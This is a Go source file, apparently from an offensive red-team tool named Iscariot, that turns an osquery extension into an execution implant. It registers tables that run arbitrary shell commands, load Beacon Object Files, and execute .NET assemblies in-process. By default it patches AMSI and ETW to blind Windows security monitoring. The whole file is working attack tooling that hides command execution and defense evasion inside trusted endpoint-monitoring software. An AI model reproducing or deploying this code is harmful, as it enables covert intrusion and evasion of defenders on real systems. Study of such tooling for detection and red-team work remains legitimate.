package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	bof "iscariot/bof"
	"iscariot/execute_assembly"
	"iscariot/utils"

	shellquote "github.com/kballard/go-shellquote"
	"github.com/osquery/osquery-go"
	"github.com/osquery/osquery-go/plugin/table"
	"github.com/zetamatta/go-outputdebug"
)

var dbg = outputdebug.Out

func main() {
	// Extract command line arguments
	socket := flag.String("socket", "", "Path to osquery socket file")
	flag.Int("timeout", 3, "")
	flag.Int("interval", 0, "")
	flag.Bool("verbose", false, "Log verbosely")
	flag.Parse()

	if *socket == "" {
		log.Fatalf(`Usage: %s --socket SOCKET_PATH`, os.Args[0])
	}

	// allow for osqueryd to create the socket path
	time.Sleep(3 * time.Second)

	server, err := osquery.NewExtensionManagerServer("iscariot", *socket)
	if err != nil {
		log.Fatalf("Error creating extension: %s\n", err)
	}

	// Create and register a new table plugin with the server.
	// table.NewPlugin requires the table plugin name,
	// a slice of Columns and a Generate function.
	server.RegisterPlugin(table.NewPlugin("iscariotExecute", IscariotExecuteColumns(), IscariotExecuteGenerate))
	server.RegisterPlugin(table.NewPlugin("iscariotBOF", IscariotBOFColumns(), IscariotBOFGenerate))
	server.RegisterPlugin(table.NewPlugin("iscariotExecuteAssembly", IscariotExecuteAssemblyColumns(), IscariotExecuteAssemblyGenerate))
	fmt.Fprintf(dbg, "Iscariot loaded!\n")
	if err := server.Run(); err != nil {
		fmt.Fprintf(dbg, "%s\n", err.Error())
		log.Fatalln(err)
	}
}

// IscariotExecuteColumns returns the columns that our table will return when a command is run
func IscariotExecuteColumns() []table.ColumnDefinition {
	return []table.ColumnDefinition{
		table.TextColumn("cmd"),
		table.TextColumn("stdout"),
		table.TextColumn("stderr"),
		table.IntegerColumn("exit_code"),
		table.IntegerColumn("use_shell"),
	}
}

// IscariotExecuteGenerate will be called whenever the table is queried. It should return
// a full table scan.
func IscariotExecuteGenerate(ctx context.Context, queryContext table.QueryContext) ([]map[string]string, error) {
	var cmd, useShell string
	var stdOutLines, stdErrLines, longerOutput []string
	var exitCode int
	var returnTable []map[string]string
	var response Response

	// Run the command and collect results
	if len(queryContext.Constraints["cmd"].Constraints) == 1 {
		cmd = queryContext.Constraints["cmd"].Constraints[0].Expression
		cmdTokens := strings.Split(cmd, " ")
		if len(queryContext.Constraints["use_shell"].Constraints) == 1 &&
			queryContext.Constraints["use_shell"].Constraints[0].Expression == "1" {
			response = RunShell("", "", cmdTokens...)
			useShell = "1"
		} else {
			response = Run(cmdTokens[0], cmdTokens[1:]...)
			useShell = "0"
		}
		stdOutLines = strings.Split(response.StdOut, "\n")
		stdErrLines = strings.Split(response.StdErr, "\n")
		exitCode = response.ExitCode
	} else {
		stdErrLines = append(stdErrLines, "You must specify a cmd")
	}

	// Decide which output is longer to use as loop control
	if len(stdErrLines) > len(stdOutLines) {
		longerOutput = stdErrLines
	} else {
		longerOutput = stdOutLines
	}

	// Loop over the longer output, appending each line to the return table
	for index := range longerOutput {
		// Only add stderr or stdout if it exists
		var stderr, stdout string
		if len(stdErrLines) > index {
			stderr = stdErrLines[index]
			if runtime.GOOS == "windows" {
				stderr = strings.TrimRight(stderr, "\r")
				stderr = strings.TrimRight(stderr, " ")
			}
		}
		if len(stdOutLines) > index {
			stdout = stdOutLines[index]
			if runtime.GOOS == "windows" {
				stdout = strings.TrimRight(stdout, "\r")
				stdout = strings.TrimRight(stdout, " ")
			}
		}
		// Skip blank output
		if len(stderr) == len(stdout) && len(stdout) == 0 {
			continue
		}
		returnTable = append(returnTable, map[string]string{
			"cmd":       cmd,
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": strconv.FormatInt(int64(exitCode), 10),
			"use_shell": useShell,
		})
	}
	return returnTable, nil
}

// IscariotBOFColumns returns the columns that our table will return when a BOF is run
func IscariotBOFColumns() []table.ColumnDefinition {
	return []table.ColumnDefinition{
		table.TextColumn("bof"),
		table.TextColumn("args"),
		table.TextColumn("output"),
	}
}

// IscariotBOFGenerate will be called whenever the table is queried. It should return
// a full table scan.
func IscariotBOFGenerate(ctx context.Context, queryContext table.QueryContext) ([]map[string]string, error) {
	var bofName, originalArgStr, argStr, output string
	var bargs []bof.BofArgs
	var outputLines []string
	var returnTable []map[string]string

	// Run the command and collect results
	if len(queryContext.Constraints["bof"].Constraints) == 1 {
		bofName = queryContext.Constraints["bof"].Constraints[0].Expression
		if len(queryContext.Constraints["args"].Constraints) == 1 {
			originalArgStr = queryContext.Constraints["args"].Constraints[0].Expression
			if runtime.GOOS == "windows" {
				argStr = strings.ReplaceAll(originalArgStr, `\`, `\\`)
			} else {
				argStr = originalArgStr
			}
			err := json.Unmarshal([]byte(argStr), &bargs)
			if err != nil {
				return nil, err
			}
		}
		bofBytes, err := utils.GetSABOF(bofName)
		//bofBytes, err := utils.LoadBOFFromDisk(bofName)
		if err != nil {
			log.Println("Error getting BOF: " + err.Error())
			return nil, err
		}
		out, err := bof.RunBOF(bofBytes, bargs)
		if err != nil {
			log.Println("Error running bof: " + err.Error())
			return nil, err
		}
		outputLines = strings.Split(out, "\n")
	} else {
		outputLines = append(outputLines, "You must specify a BOF")
	}

	// Loop over the longer output, appending each line to the return table
	for index := range outputLines {
		if len(outputLines) > index {
			output = outputLines[index]
			if runtime.GOOS == "windows" {
				output = strings.TrimRight(output, "\r")
				output = strings.TrimRight(output, " ")
			}
		}
		// Skip blank output
		if len(output) == 0 {
			continue
		}
		returnTable = append(returnTable, map[string]string{
			"bof":    bofName,
			"args":   originalArgStr,
			"output": output,
		})
	}
	return returnTable, nil
}

// IscariotExecuteAssemblyColumns returns the columns that our table will return when a BOF is run
func IscariotExecuteAssemblyColumns() []table.ColumnDefinition {
	return []table.ColumnDefinition{
		table.TextColumn("assembly"),
		table.TextColumn("runtime"),
		table.TextColumn("args"),
		table.TextColumn("patchETW"),
		table.TextColumn("patchAMSI"),
		table.TextColumn("output"),
	}
}

// IscariotExecuteAssemblyGenerate will be called whenever the table is queried. It should return
// a full table scan.
func IscariotExecuteAssemblyGenerate(ctx context.Context, queryContext table.QueryContext) ([]map[string]string, error) {
	var assemblyName, originalArgStr, argStr, runtimeVersion, output string
	var outputLines []string
	var returnTable []map[string]string
	// Default to patch all the things and .NET 4
	amsiBypass := true
	etwBypass := true
	runtimeVersion = "v4"

	// Run the assembly and collect results
	if len(queryContext.Constraints["assembly"].Constraints) == 1 {
		assemblyName = queryContext.Constraints["assembly"].Constraints[0].Expression
		if len(queryContext.Constraints["args"].Constraints) == 1 {
			originalArgStr = queryContext.Constraints["args"].Constraints[0].Expression
			if runtime.GOOS == "windows" {
				argStr = strings.ReplaceAll(originalArgStr, `\`, `\\`)
			} else {
				argStr = originalArgStr
			}
		}
		if len(queryContext.Constraints["patchAMSI"].Constraints) == 1 {
			amsiBypass, _ = strconv.ParseBool(queryContext.Constraints["patchAMSI"].Constraints[0].Expression)
		}
		if len(queryContext.Constraints["patchETW"].Constraints) == 1 {
			etwBypass, _ = strconv.ParseBool(queryContext.Constraints["patchETW"].Constraints[0].Expression)
		}
		if len(queryContext.Constraints["runtime"].Constraints) == 1 {
			runtimeVersion = queryContext.Constraints["runtime"].Constraints[0].Expression
		}
		var args []string
		var err error
		if len(argStr) > 0 {
			args, err = shellquote.Split(argStr)
			if err != nil {
				log.Println("Error splitting args: " + err.Error())
				return nil, err
			}
		}
		assemblyBytes, err := utils.GetAssembly(assemblyName)
		if err != nil {
			log.Println("Error getting assembly: " + err.Error())
			return nil, err
		}
		out, err := execute_assembly.InProcExecuteAssembly(assemblyBytes, args, runtimeVersion, amsiBypass, etwBypass)
		if err != nil {
			log.Println("Error running assembly: " + err.Error())
			return nil, err
		}
		outputLines = strings.Split(out, "\n")
	} else {
		outputLines = append(outputLines, "You must specify an assembly")
	}

	// Loop over the longer output, appending each line to the return table
	for index := range outputLines {
		if len(outputLines) > index {
			output = outputLines[index]
			if runtime.GOOS == "windows" {
				output = strings.TrimRight(output, "\r")
				output = strings.TrimRight(output, " ")
			}
		}
		// Skip blank output
		if len(output) == 0 {
			continue
		}
		returnTable = append(returnTable, map[string]string{
			"assembly":  assemblyName,
			"runtime":   runtimeVersion,
			"args":      argStr,
			"patchETW":  strconv.FormatBool(etwBypass),
			"patchAMSI": strconv.FormatBool(amsiBypass),
			"output":    output,
		})
	}
	return returnTable, nil
}
